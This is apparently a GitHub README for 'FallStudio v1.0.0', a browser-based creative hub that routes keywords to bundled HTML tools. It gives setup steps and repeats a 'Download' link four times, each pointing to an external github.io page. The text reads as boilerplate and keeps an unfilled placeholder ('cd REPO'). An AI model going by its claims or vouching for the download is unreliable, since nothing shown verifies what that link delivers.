# FallStudio v1.0.0 - creative suite hub 2026

> **FallStudio is a browser-based creative suite hub for web users, combining a single-file HTML app launcher with offline, local-first routing and the current 1.0.0 release.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millervictor98/fallstudio-2026-hub?style=flat-square)](https://github.com/millervictor98/fallstudio-2026-hub)

---

<p align="center">
  <a href="https://millervictor98.github.io/fallstudio-2026-hub/">
    <img src="https://img.shields.io/badge/Download-FallStudio%20Latest-brightgreen?style=for-the-badge" alt="Download FallStudio">
  </a>
</p>

> **[Direct Download - FallStudio v1.0.0](https://millervictor98.github.io/fallstudio-2026-hub/)**

---

[Download Latest Build](https://millervictor98.github.io/fallstudio-2026-hub/)

---

## What FallStudio Is

FallStudio is a streamlined creative suite hub built to help users jump from an idea to the right tool without managing a bulky desktop setup. It is made for browser-first use and can run from local files, which makes it a convenient self-contained interface when you want something low-friction to launch and use.

Its core idea is intent-based routing for creative work. Instead of searching through separate apps, FallStudio leans on keyword navigation, a command palette, and built-in shortcuts to steer you toward the most relevant workflow. That makes it a strong fit for anyone looking for a local-first, sovereign setup with optional PWA installation.

---

## Highlights

- Sends creative intent to the proper tool through keyword-driven navigation
- Bundles 8 single-HTML tools into one hub
- Provides Ctrl+K access to the command palette
- Opens straight from file:// with no installation required
- Includes PWA install support for a more app-like feel
- Works without dependencies or a build step
- Delivers offline keyword-based routing
- Supports local LLM and BYOK routing flows

---

## Getting Started

1. Download or clone the repository.
2. Open the main HTML file in a browser, or serve the folder locally if you prefer.
3. For a local launch, use a simple static server and open the app in your browser.

Example:

    git clone https://github.com/millervictor98/fallstudio-2026-hub.git
    cd REPO
    python -m http.server 8000

Then visit:

    http://localhost:8000

If you are using the packaged single-file version, you can also open it directly from your file system.

---

## How to Use It

Begin by typing a creative task or opening the command palette with Ctrl+K. FallStudio then maps your input to the most relevant included tool, letting you move quickly from intent to action.

Typical workflow:

1. Open FallStudio in a browser.
2. Type a keyword, task, or creative goal.
3. Use the routed tool that matches the intent.
4. Install it as a PWA if you want quicker repeat access.

For offline use, keep the local HTML file available in your browser or saved workspace. If you use local LLM or BYOK routing, connect your preferred local or user-provided model settings before starting a session.

---

## Customization

FallStudio stays intentionally lightweight, so most behavior lives inside the HTML app itself rather than in a separate configuration layer.

If you are customizing it, look for:
- routing keywords in the main HTML file
- local LLM or BYOK connection settings
- PWA-related metadata and install prompts
- tool definitions for the included single-file apps

There is no build-time configuration required.

---

## Requirements

- A modern web browser
- HTML file access for file:// usage, or a basic static server
- Enough local storage for browser caching if you install it as a PWA
- Optional: access to a local LLM or BYOK setup if you want those routing features

No dependency installation or compile step is needed.

---

## FAQ

**How do I update FallStudio?**  
Swap in the latest release or pull the newest files from the repository, then reopen the main HTML file.

**Can I use it offline?**  
Yes. The project supports offline keyword-based routing and can run from local files.

**Does it require installation?**  
No. You can open it directly in a browser. PWA installation is optional.

**Where are settings kept?**  
Settings are handled inside the app or in browser storage, depending on how you use it.

**What if a tool does not open as expected?**  
Make sure you are using a modern browser and that the HTML file or local server path is being loaded correctly. If you changed routing keywords, verify the keyword mappings in the app source.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
